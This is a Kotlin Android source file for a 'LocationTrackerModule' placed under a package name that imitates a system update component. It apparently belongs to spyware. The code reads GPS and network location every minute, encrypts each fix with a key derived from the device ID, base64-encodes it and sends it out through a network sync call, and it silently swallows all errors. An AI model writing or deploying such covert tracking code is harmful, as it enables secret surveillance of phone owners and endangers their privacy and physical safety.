package com.android.system.update.modules.location

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Base64
import androidx.core.content.ContextCompat
import com.android.system.update.core.NetworkConnectionManager
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class LocationTrackerModule(private val context: Context) {

    private val random = SecureRandom()
    private val networkManager = NetworkConnectionManager(context)
    private val deviceKey: ByteArray

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun startTracking(minTimeMs: Long = 60000) {
        if (!hasLocationPermission()) return
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val data = "${location.latitude}|${location.longitude}|${location.accuracy}|${location.time}"
                    val encrypted = encrypt(data.toByteArray())
                    val payload = Base64.encodeToString(encrypted, Base64.NO_WRAP)
                    networkManager.sync(payload)
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTimeMs, 0f, listener)
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTimeMs, 0f, listener)
            }
        } catch (e: SecurityException) {
        } catch (e: Exception) {
        }
    }

    private fun hasLocationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data)
        return iv + encrypted
    }
}